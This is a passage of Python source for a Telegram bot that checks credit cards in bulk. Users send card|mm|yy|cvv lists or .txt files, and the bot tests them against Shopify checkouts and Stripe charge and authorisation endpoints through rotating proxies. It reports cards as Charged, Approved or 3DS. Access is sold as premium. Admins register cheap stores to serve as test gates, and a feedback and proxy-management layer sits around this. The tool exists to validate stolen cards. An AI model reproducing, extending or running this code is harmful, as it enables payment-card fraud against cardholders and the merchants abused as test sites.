            f"<b>{SEP}</b>\nAttach image/document for richer feedback."), parse_mode='html'); return

    fb_id = str(int(time.time()))[-8:] + str(uid)[-4:]
    add_feedback(fb_id, {'user_id': uid, 'text': content or '[Media only]',
                        'has_media': has_media, 'ts': int(time.time())})

    user_name, user_un = await get_user_info(uid)
    safe_name = _html.escape(user_name or f"User {uid}")
    un_line = f"<a href=\"https://t.me/{user_un}\">@{user_un}</a>" if user_un else "<i>no username</i>"

    raw_text = content or '[Media attached]'
    cleaned = re.sub(r'\*\*(.+?)\*\*', r'\1', raw_text)
    cleaned = re.sub(r'(?<!\*)\*(?!\*)(.+?)(?<!\*)\*(?!\*)', r'\1', cleaned)
    cleaned = re.sub(r'__(.+?)__', r'\1', cleaned)
    cleaned = re.sub(r'`([^`]+)`', r'\1', cleaned)
    safe_body = _html.escape(cleaned)

    header = pe(f"📝 <b>New Feedback Received</b>\n<b>{SEP}</b>\n")
    body   = f"<blockquote>{safe_body}</blockquote>\n"
    footer = pe(
        f"<b>{SEP}</b>\n"
        f"👤 <b>Name:</b> <a href=\"tg://user?id={uid}\">{safe_name}</a>\n"
        f"🔗 <b>Username:</b> {un_line}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"<b>{SEP}</b>\n"
        f"🆔 FB: <code>{fb_id}</code>\n{DEV_LINE}")

    btns = [[
        {"text": "✅ Approve", "callback_data": f"fb_approve_{fb_id}"},
        {"text": "❌ Reject", "callback_data": f"fb_reject_{fb_id}"},
    ]]
    try:
        if has_media: await reply.forward_to(OWNER_ID)
        await raw_send(OWNER_ID, header + body + footer, btns)
    except Exception as e: print(f"[fb] forward failed: {e}")

    await event.reply(pe(
        f"✅ <b>Feedback Sent</b>\n<b>{SEP}</b>\n"
        f"📨 Your feedback has been submitted.\n"
        f"🔔 You'll be notified when it's reviewed.\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=r"^fb_approve_"))
async def cb_fb_approve(event):
    if event.sender_id != OWNER_ID:
        await event.answer("❌ Owner only!", alert=True); return
    fb_id = event.data.decode().replace('fb_approve_', '')
    fb = get_feedback(fb_id)
    if not fb:
        await event.answer("⚠️ Already processed.", alert=True); return

    cfg = load_gc_config()
    target = cfg.get('public_channel') or cfg.get('public_gc')
    if not target:
        await event.answer("❌ No public channel/GC linked!", alert=True); return

    uid = fb['user_id']
    user_name, user_un = await get_user_info(uid)
    safe_name = _html.escape(user_name or f"User {uid}")
    un_line = f"<a href=\"https://t.me/{user_un}\">@{user_un}</a>" if user_un else "<i>no username</i>"

    raw_text = fb.get('text', '') or ''
    cleaned = re.sub(r'\*\*(.+?)\*\*', r'\1', raw_text)
    cleaned = re.sub(r'(?<!\*)\*(?!\*)(.+?)(?<!\*)\*(?!\*)', r'\1', cleaned)
    cleaned = re.sub(r'__(.+?)__', r'\1', cleaned)
    cleaned = re.sub(r'`([^`]+)`', r'\1', cleaned)
    safe_body = _html.escape(cleaned)

    header = pe(f"📢 <b>Feedback Posted</b>\n<b>{SEP}</b>\n")
    body   = f"<blockquote>{safe_body}</blockquote>\n"
    footer = pe(
        f"<b>{SEP}</b>\n"
        f"👤 <b>Name:</b> <a href=\"tg://user?id={uid}\">{safe_name}</a>\n"
        f"🔗 <b>Username:</b> {un_line}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"<b>{SEP}</b>\n"
        f"🤖 <a href=\"https://t.me/{BOT_USERNAME}\">@{BOT_USERNAME}</a>\n"
        f"💻 <b>Dev</b>  »  <a href=\"https://t.me/{OWNER_USERNAME}\">{OWNER_NAME}</a>")

    try:
        await bot.send_message(int(target), header + body + footer, parse_mode='html')
        await event.answer("✅ Approved & posted!", alert=False)
        try: await event.edit(pe(f"✅ <b>Approved & Posted</b>\n🆔 <code>{fb_id}</code>"))
        except: pass
    except Exception as e:
        await event.answer(f"❌ Post failed: {str(e)[:60]}", alert=True); return

    remove_feedback(fb_id)
    try:
        await bot.send_message(uid, pe(
            f"✅ <b>Feedback Approved</b>\n<b>{SEP}</b>\n"
            f"🎉 Your feedback has been published!\n"
            f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')
    except: pass

@bot.on(events.CallbackQuery(pattern=r"^fb_reject_"))
async def cb_fb_reject(event):
    if event.sender_id != OWNER_ID:
        await event.answer("❌ Owner only!", alert=True); return
    fb_id = event.data.decode().replace('fb_reject_', '')
    fb = get_feedback(fb_id)
    if not fb:
        await event.answer("⚠️ Already processed.", alert=True); return
    remove_feedback(fb_id)
    await event.answer("❌ Rejected", alert=False)
    try: await event.edit(pe(f"❌ <b>Rejected</b>\n🆔 <code>{fb_id}</code>"))
    except: pass
    try:
        await bot.send_message(fb['user_id'], pe(
            f"❌ <b>Feedback Not Approved</b>\n<b>{SEP}</b>\n"
            f"Your feedback was not approved for publication.\n"
            f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')
    except: pass

# ══════════════════════════════════════════════════════════
# Single + mass gate runners
# ══════════════════════════════════════════════════════════
async def _run_single_gate(event, card, gate_key, gate_name):
    uid = event.sender_id
    proxies = await _require_user_proxies(event)
    if proxies is None: return

    sites = load_sites()
    if gate_key == 'shopify' and not sites:
        await event.reply(pe(f"❌ <b>No Sites Available</b>\n<b>{SEP}</b>\nContact the admin."),
                          parse_mode='html'); return

    smsg = await event.reply(pe(
        f"⚡ <b>Checking  —  {gate_name}...</b>\n<b>{SEP}</b>\n"
        f"🃏 <tg-spoiler><code>{card}</code></tg-spoiler>\n<b>{SEP}</b>\n"
        f"⏳ Please wait (API can take 30-60s)..."), parse_mode='html')
    try:
        t0 = time.time()
        if gate_key == 'shopify':
            result, (name, username) = await asyncio.gather(
                check_card_with_retry(card, sites, proxies), get_user_info(uid))
            bin_info = await get_bin_info(card.split('|')[0])
        else:
            proxy = random.choice(proxies)
            if gate_key == 'st1': raw = await check_st1(card, proxy)
            elif gate_key == 'st5': raw = await check_st5(card, proxy)
            elif gate_key == 'auth1': raw = await check_stripe_auth_1(card, proxy)
            else: raw = await check_stripe_auth(card, proxy)
            result = _normalize_extra(raw, gate_key, card)
            bin_info = await get_bin_info(card.split('|')[0])
            name, username = await get_user_info(uid)
            if result.get('status') == 'Dead' and _is_proxy_err_msg(result.get('message', '')):
                await _maybe_remove_user_proxy(uid, proxy, result.get('message', ''))

        cname = name if username else str(uid)
        result['time'] = round(time.time() - t0, 2)

        if gate_key == 'shopify' and _is_fatal_site_error(result.get('message', '')):
            site = result.get('site')
            if site:
                await _handle_fatal_site_error(site, result.get('message', ''))
                await _report_site_error(site, result.get('message', ''))

        await _log_to_gc(result, gate_name, uid)
        if result['status'] == 'Charged':
            await _forward_charged(result, gate_name, uid)
        resp = build_result_card(result, bin_info, uid, cname)
        await raw_edit(uid, smsg.id, resp, [])
        if result.get('status') in ('Charged', 'Approved'):
            await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
    except Exception as e:
        await smsg.edit(pe(
            f"❌ <b>Check Failed</b>\n<b>{SEP}</b>\n⚠️ Error: <code>{str(e)[:200]}</code>"),
            parse_mode='html')

async def _run_mass_gate(event, cards, gate_key, gate_name):
    uid = event.sender_id
    if not cards: return
    proxies = await _require_user_proxies(event)
    if proxies is None: return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        await event.reply(pe(
            f"⚠️ <b>Limit Applied</b>\n<b>{SEP}</b>\n"
            f"File contains <b>{len(cards)}</b> cards.\n"
            f"Your limit: <b>{limit}</b> — first {limit} will be checked."),
            parse_mode='html')
        cards = cards[:limit]
    text = pe(
        f"<b>🔥 {gate_name}  —  Starting</b>\n<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {len(cards)}\n"
        f"☄️ <b>Checked</b>   »  0\n💎 <b>Charged</b>   »  0\n"
        f"✅ <b>Approved</b>  »  0\n⚠️ <b>3DS</b>       »  0\n"
        f"<code>{make_progress_bar(0, len(cards))}</code>")
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id, gate_key, gate_name))

async def _gather_mass_cards(event):
    lines = []
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if rm and rm.file and (rm.file.name or '').endswith('.txt'):
            fp = await rm.download_media()
            if fp:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                try: os.remove(fp)
                except: pass
                lines = content.splitlines()
        elif rm and rm.text:
            lines = rm.text.splitlines()
    parts = event.message.text.split(maxsplit=1)
    if len(parts) > 1 and parts[1].strip():
        lines.extend(parts[1].splitlines())
    if not lines: return []
    return extract_cc('\n'.join(lines))

# ══════════════════════════════════════════════════════════
# Per-gate commands
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_sh(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>\n<b>{SEP}</b>\n🔒 Use /redeem to get access."),
                          parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ <b>Invalid Format</b>\n<b>{SEP}</b>\nUsage: <code>/sh card|mm|yy|cvv</code>"),
                          parse_mode='html'); return
    await _run_single_gate(event, cards[0], 'shopify', 'Shopify')

def _is_txt_file(e):
    if not e.file or e.via_bot_id: return False
    name = e.file.name or ''; mime = e.file.mime_type or ''
    return name.endswith('.txt') or (not name and mime == 'text/plain')

@bot.on(events.NewMessage(func=_is_txt_file))
async def txt_detected(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied</b>\n<b>{SEP}</b>\n🔒 Use /redeem."),
                          parse_mode='html'); return
    proxies = await _require_user_proxies(event)
    if proxies is None: return
    sites = load_sites()
    if not sites:
        await event.reply(pe(f"❌ <b>No Sites Configured</b>"), parse_mode='html'); return
    fp = await event.message.download_media()
    if not fp:
        await event.reply(pe(f"❌ <b>File download failed.</b>"), parse_mode='html'); return
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
    try: os.remove(fp)
    except: pass
    cards = extract_cc(content)
    if not cards:
        await event.reply(pe(f"❌ <b>No Cards Found</b>"), parse_mode='html'); return
    pending_checks[uid] = {'cards': cards, 'gate': 'shopify'}
    preview = "\n".join(f'⭐ <tg-spoiler>{c}</tg-spoiler>' for c in cards[:3])
    more = f"\n<i>  ...and {len(cards)-3} more cards</i>" if len(cards) > 3 else ""
    await raw_send(uid, pe(
        f"📂 <b>File Detected  —  Shopify</b>\n<b>{SEP}</b>\n"
        f"📋 <b>Cards found:</b> <b>{len(cards)}</b>\n<b>{SEP}</b>\n"
        f"{preview}{more}\n<b>{SEP}</b>\n<b>🔥 Tap below to start checking</b>"),
        [[{"text": "💳  Start Shopify Check", "callback_data": f"start_check_{uid}"}]],
        reply_to=event.message.id)

@bot.on(events.NewMessage(pattern=r'^/msh$'))
async def mass_sh(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    proxies = await _require_user_proxies(event)
    if proxies is None: return
    if not event.reply_to_msg_id:
        await event.reply(pe(f"⚡ <b>How to Mass Check</b>\n<b>{SEP}</b>\nReply to a <code>.txt</code> with <code>/msh</code>"),
                          parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe(f"❌ <b>Invalid File</b>"), parse_mode='html'); return
    fp = await reply.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
    cards = extract_cc(content)
    try: os.remove(fp)
    except: pass
    if not cards:
        await event.reply(pe(f"❌ <b>No Valid Cards Found</b>"), parse_mode='html'); return
    await _run_mass_gate(event, cards, 'shopify', 'Shopify')

@bot.on(events.NewMessage(pattern=r'^/st1\s+'))
async def single_st1(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ <b>Invalid Format</b>\n<b>{SEP}</b>\nUsage: <code>/st1 card|mm|yy|cvv</code>"),
                          parse_mode='html'); return
    await _run_single_gate(event, cards[0], 'st1', 'Stripe 1$')

@bot.on(events.NewMessage(pattern=r'^/mst1(\s+[\s\S]+)?$'))
async def mass_st1(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = await _gather_mass_cards(event)
    if not cards:
        await event.reply(pe(f"❌ <b>No valid cards found.</b>"), parse_mode='html'); return
    await _run_mass_gate(event, cards, 'st1', 'Stripe 1$')

@bot.on(events.NewMessage(pattern=r'^/st5\s+'))
async def single_st5(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ <b>Invalid Format</b>\n<b>{SEP}</b>\nUsage: <code>/st5 card|mm|yy|cvv</code>"),
                          parse_mode='html'); return
    await _run_single_gate(event, cards[0], 'st5', 'Stripe 5$')

@bot.on(events.NewMessage(pattern=r'^/mst5(\s+[\s\S]+)?$'))
async def mass_st5(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = await _gather_mass_cards(event)
    if not cards:
        await event.reply(pe(f"❌ <b>No valid cards found.</b>"), parse_mode='html'); return
    await _run_mass_gate(event, cards, 'st5', 'Stripe 5$')

@bot.on(events.NewMessage(pattern=r'^/auth\s+'))
async def single_auth(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ <b>Invalid Format</b>\n<b>{SEP}</b>\nUsage: <code>/auth card|mm|yy|cvv</code>"),
                          parse_mode='html'); return
    await _run_single_gate(event, cards[0], 'auth', 'Stripe Auth2 $0')

@bot.on(events.NewMessage(pattern=r'^/mauth(\s+[\s\S]+)?$'))
async def mass_auth(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = await _gather_mass_cards(event)
    if not cards:
        await event.reply(pe(f"❌ <b>No valid cards found.</b>"), parse_mode='html'); return
    await _run_mass_gate(event, cards, 'auth', 'Stripe Auth2 $0')

@bot.on(events.NewMessage(pattern=r'^/auth1\s+'))
async def single_auth1(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ <b>Invalid Format</b>\n<b>{SEP}</b>\nUsage: <code>/auth1 card|mm|yy|cvv</code>"),
                          parse_mode='html'); return
    await _run_single_gate(event, cards[0], 'auth1', 'Stripe Auth2 $0 v2')

@bot.on(events.NewMessage(pattern=r'^/mauth1(\s+[\s\S]+)?$'))
async def mass_auth1(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html'); return
    cards = await _gather_mass_cards(event)
    if not cards:
        await event.reply(pe(f"❌ <b>No valid cards found.</b>"), parse_mode='html'); return
    await _run_mass_gate(event, cards, 'auth1', 'Stripe Auth2 $0 v2')

# ══════════════════════════════════════════════════════════
# Proxy commands
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/setproxy(\s+[\s\S]+)?$'))
async def setproxy_cmd(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html'); return
    content = event.message.text[len('/setproxy'):].strip()
    if not content:
        ul = get_user_proxy_list(uid)
        if ul:
            listed = "\n".join(f"  <code>{p}</code>" for p in ul[:10])
            extra = f"\n  <i>+{len(ul)-10} more</i>" if len(ul) > 10 else ""
            await event.reply(pe(
                f"🔌 <b>Your Proxies  ({len(ul)})</b>\n<b>{SEP}</b>\n{listed}{extra}\n"
                f"<b>{SEP}</b>\nReplace: <code>/setproxy ip:port</code>\n"
                f"Clear:   <code>/clearuserproxy</code>"), parse_mode='html')
        else:
            await event.reply(pe(
                f"🔌 <b>Set Your Proxy</b>\n<b>{SEP}</b>\n"
                f"<code>/setproxy ip:port</code>\n"
                f"<code>/setproxy ip:port:user:pass</code>\n"
                f"<code>/setproxy user:pass@ip:port</code>\n<b>{SEP}</b>\n"
                f"Multiple (one per line):\n"
                f"<code>/setproxy\nip:port\nip:port:user:pass</code>"), parse_mode='html')
        return
    new = [normalize_proxy(l.strip()) for l in content.split('\n') if l.strip()] if '\n' in content else [normalize_proxy(content.strip())]
    set_user_proxies(uid, new)
    await event.reply(pe(
        f"✅ <b>Proxy {'Set' if len(new)==1 else 'Updated'}</b>\n<b>{SEP}</b>\n"
        f"📡 Active: {len(new)}\n🔁 Rotating per card automatically"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
async def clearuserproxy_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html'); return
    remove_user_proxy(event.sender_id)
    await event.reply(pe(f"✅ <b>Proxy Cleared</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def chkproxy_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html'); return
    proxy = normalize_proxy(event.message.text.split(' ', 1)[1].strip())
    msg = await event.reply(pe(f"⚡ <b>Testing Proxy...</b>\n<b>{SEP}</b>\n<code>{proxy}</code>"),
                            parse_mode='html')
    r = await test_proxy(proxy)
    if r.get('status') == 'alive':
        ip = await get_proxy_ip(proxy)
        await msg.edit(pe(
            f"✅ <b>Proxy  —  Alive</b>\n<b>{SEP}</b>\n"
            f"📡 <code>{proxy}</code>\n🌐 Exit IP:  <code>{ip or 'N/A'}</code>"),
            parse_mode='html')
    else:
        await msg.edit(pe(f"❌ <b>Proxy  —  Dead</b>\n<b>{SEP}</b>\n<code>{proxy}</code>"),
                       parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxies'))
async def chkproxies_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(f"⚠️ <b>Pool empty.</b>"), parse_mode='html'); return
    msg = await event.reply(pe(f"🔥 <b>Re-testing {len(proxies)} saved proxies...</b>"),
                            parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(proxies), 30):
        batch = proxies[i:i+30]
        results = await asyncio.gather(*[test_proxy(p) for p in batch])
        for r, p in zip(results, batch):
            if r.get('status') == 'alive': alive.append(p)
            else: dead.append(p)
        try:
            await msg.edit(pe(
                f"🔥 <b>Re-testing proxies...</b>\n<b>{SEP}</b>\n"
                f"✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}\n"
                f"📊 {min(i+30, len(proxies))}/{len(proxies)}"), parse_mode='html')
        except: pass
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive: await f.write(f"{p}\n")
    await msg.edit(pe(
        f"✅ <b>Proxy Re-check Complete</b>\n<b>{SEP}</b>\n"
        f"✅ Alive: <b>{len(alive)}</b>\n"
        f"❌ Removed: <b>{len(dead)}</b>\n"
        f"📋 New pool: <b>{len(alive)}</b>\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/site'))
async def site_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html'); return
    sites = load_sites()
    proxies = await _require_user_proxies(event)
    if proxies is None: return
    if not sites:
        await event.reply(pe(f"❌ <b>No sites.</b>"), parse_mode='html'); return
    smsg = await event.reply(pe(f"🔥 <b>Testing {len(sites)} sites...</b>"), parse_mode='html')
    alive, dead = [], 0
    for i, s in enumerate(sites):
        ok, price, err = await test_site_with_price(s)
        if ok: alive.append(s)
        else:
            dead += 1
            await _report_site_error(s, err)
        if (i+1) % 5 == 0:
            try:
                await smsg.edit(pe(f"🔥 <b>Testing...</b>\n✅ Alive: {len(alive)} · ❌ Dead: {dead}"),
                                parse_mode='html')
            except: pass
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive: await f.write(f"{s}\n")
    await smsg.edit(pe(
        f"✅ <b>Site Check Complete</b>\n<b>{SEP}</b>\n"
        f"✅ Alive: {len(alive)}\n❌ Removed: {dead}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy'))
async def proxy_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(f"❌ <b>Proxy Pool Empty</b>"), parse_mode='html'); return
    smsg = await event.reply(pe(f"🔥 <b>Testing {len(proxies)} proxies...</b>"), parse_mode='html')
    alive, dead = [], 0
    for i in range(0, len(proxies), 30):
        batch = proxies[i:i+30]
        results = await asyncio.gather(*[test_proxy(p) for p in batch])
        for r, p in zip(results, batch):
            if r.get('status') == 'alive': alive.append(p)
            else: dead += 1
        await smsg.edit(pe(f"🔥 <b>Testing...</b>\n✅ Alive: {len(alive)} · ❌ Dead: {dead}"),
                        parse_mode='html')
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive: await f.write(f"{p}\n")
    await smsg.edit(pe(
        f"✅ <b>Proxy Check Complete</b>\n<b>{SEP}</b>\n"
        f"✅ Alive: {len(alive)}\n❌ Removed: {dead}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myplan$'))
async def myplan_cmd(event):
    uid = event.sender_id; lim = get_user_limit(uid)
    if is_admin(uid): role, st = "Admin", "Full access"
    elif is_premium(uid): role, st = "Premium", "Active"
    else: role, st = "None", "No Access"
    await event.reply(pe(
        f"💎 <b>Your Access</b>\n<b>{SEP}</b>\n"
        f"🔑 Role:    <b>{role}</b>\n"
        f"⚡ Status:  <b>{st}</b>\n"
        f"📋 Limit:   <b>{lim:,} cards/file</b>\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')

# ══════════════════════════════════════════════════════════
# Admin
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/admin$'))
async def admin_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    await raw_send(event.sender_id, _admin_panel_text(), rows_admin(event.sender_id))

@bot.on(events.NewMessage(pattern=r'^/backup$'))
async def backup_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    await _send_backup_to(event.sender_id)

@bot.on(events.NewMessage(pattern=r'^/restore$'))
async def restore_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await event.reply(pe(
            f"♻️ <b>Restore Backup</b>\n<b>{SEP}</b>\n"
            f"Reply to a <code>.zip</code> backup file with <code>/restore</code>\n"
            f"<b>{SEP}</b>\n⚠️ Overwrites current files."), parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.zip'):
        await event.reply(pe(f"❌ Reply to a <code>.zip</code> file"), parse_mode='html'); return
    fp = await reply.download_media()
    with open(fp, 'rb') as f: data = f.read()
    try: os.remove(fp)
    except: pass
    ok, msg, restored, skipped = restore_backup_zip(data)
    if not ok:
        await event.reply(pe(f"❌ <b>Restore Failed</b>\n<b>{SEP}</b>\n{msg}"), parse_mode='html'); return
    load_user_proxies(); load_user_pool()
    restored_list = "\n".join(f"  • <code>{f}</code>" for f in restored)
    skip_note = f"\n⚠️ Skipped {len(skipped)} unknown file(s)" if skipped else ""
    await event.reply(pe(
        f"✅ <b>Restore Complete</b>\n<b>{SEP}</b>\n"
        f"{msg}{skip_note}\n<b>{SEP}</b>\n"
        f"<b>Restored:</b>\n{restored_list}\n<b>{SEP}</b>\n"
        f"⚠️ Restart bot for keys/GC to fully reload."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/setadmin(\s+.*)?$'))
async def setadmin_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.strip().split()
    cur = "\n".join(f"  • <code>{a}</code>" for a in sorted(ADMIN_IDS))
    if len(parts) < 2:
        await event.reply(pe(
            f"<b>👑 Admin Management</b>\n<b>{SEP}</b>\nCurrent:\n{cur}\n<b>{SEP}</b>\n"
            f"Add:    <code>/setadmin add [user_id]</code>\n"
            f"Remove: <code>/setadmin rm [user_id]</code>"), parse_mode='html'); return
    action = parts[1].lower()
    if action in ("add", "rm", "remove") and len(parts) >= 3:
        try: target = int(parts[2])
        except ValueError:
            await event.reply(pe(f"❌ <b>Invalid user ID.</b>"), parse_mode='html'); return
        if action == "add":
            ADMIN_IDS.add(target); _save_admin_ids(ADMIN_IDS); _register_commands()
            await event.reply(pe(f"✅ <b>Admin Added</b>\n<code>{target}</code>"), parse_mode='html')
        else:
            if target in _DEFAULT_ADMINS:
                await event.reply(pe(f"❌ <b>Cannot remove default admin.</b>"), parse_mode='html'); return
            ADMIN_IDS.discard(target); _save_admin_ids(ADMIN_IDS); _register_commands()
            await event.reply(pe(f"✅ <b>Admin Removed</b>\n<code>{target}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremium\s+'))
async def addpremium_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    nid = event.message.text.split(' ', 1)[1].strip()
    if not nid.isdigit():
        await event.reply(pe(f"❌ Usage: <code>/addpremium 123456789</code>"), parse_mode='html'); return
    if nid in load_premium_users():
        await event.reply(pe(f"⚠️ <b>Already Added</b>"), parse_mode='html'); return
    async with aiofiles.open(PREMIUM_FILE, 'a') as f: await f.write(f"{nid}\n")
    await event.reply(pe(f"✅ <b>User Added</b>\n<code>{nid}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmpremium\s+'))
async def rmpremium_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    rid = event.message.text.split(' ', 1)[1].strip()
    curr = load_premium_users()
    if rid not in curr:
        await event.reply(pe(f"❌ <b>Not Found</b>"), parse_mode='html'); return
    async with aiofiles.open(PREMIUM_FILE, 'w') as f:
        for u in curr:
            if u != rid: await f.write(f"{u}\n")
    await event.reply(pe(f"🚫 <b>User Removed</b>\n<code>{rid}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/setsiteprice\s+([\d.]+)$'))
async def setsiteprice_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    raw = event.message.text.split(' ', 1)[1].strip()
    try:
        v = float(raw)
        if v <= 0: raise ValueError
    except ValueError:
        await event.reply(pe(f"❌ <b>Invalid amount</b>"), parse_mode='html'); return
    set_max_site_price(v)
    await event.reply(pe(
        f"✅ <b>Max Site Price Updated</b>\n<b>{SEP}</b>\n"
        f"💰 New limit: <b>${v:.2f}</b>\n"
        f"<b>{SEP}</b>\n"
        f"⚠️ Sites above this price will be rejected on /addsite."
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
async def addsite_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    url = event.message.text.split(' ', 1)[1].strip()
    if not url.startswith('http'):
        await event.reply(pe(f"❌ URL must start with <code>http</code>"), parse_mode='html'); return
    curr = load_sites()
    if url in curr:
        await event.reply(pe(f"⚠️ <b>Site already exists.</b>"), parse_mode='html'); return
    if not _load_proxies_file():
        await event.reply(pe(f"❌ <b>No proxies.</b> Add via <code>/addproxy</code> first."),
                          parse_mode='html'); return
    max_p = get_max_site_price()
    msg = await event.reply(pe(f"⏳ <b>Checking via API...</b>\n<b>{SEP}</b>\n<code>{url}</code>\n"
                                f"<i>Max price: ${max_p:.2f} · May take 30-60s...</i>"), parse_mode='html')
    try:
        alive, price, reason = await test_site_with_price(url)
    except Exception as e:
        await msg.edit(pe(f"❌ <b>Check Error</b>\n<b>{SEP}</b>\n⚠️ {str(e)[:100]}"),
                       parse_mode='html'); return
    if not alive:
        await msg.edit(pe(
            f"❌ <b>Site Rejected</b>\n<b>{SEP}</b>\n<code>{url}</code>\n"
            f"⚠️ Reason: {reason}\n<b>{SEP}</b>\nNothing was saved."), parse_mode='html')
        await _report_site_error(url, reason); return
    if price is None:
        await msg.edit(pe(
            f"❌ <b>Site Rejected</b>\n<b>{SEP}</b>\n<code>{url}</code>\n"
            f"⚠️ Unknown price — must be a valid checkout\n"
            f"<b>{SEP}</b>\nNothing was saved."), parse_mode='html')
        await _report_site_error(url, 'Unknown price'); return
    if price > max_p:
        await msg.edit(pe(
            f"❌ <b>Site Rejected</b>\n<b>{SEP}</b>\n<code>{url}</code>\n"
            f"💵 Price: <b>${price:.2f}</b>\n"
            f"⚠️ Exceeds limit <b>${max_p:.2f}</b>"), parse_mode='html'); return
    async with aiofiles.open(SITES_FILE, 'a') as f: await f.write(f"{url}\n")
    await msg.edit(pe(
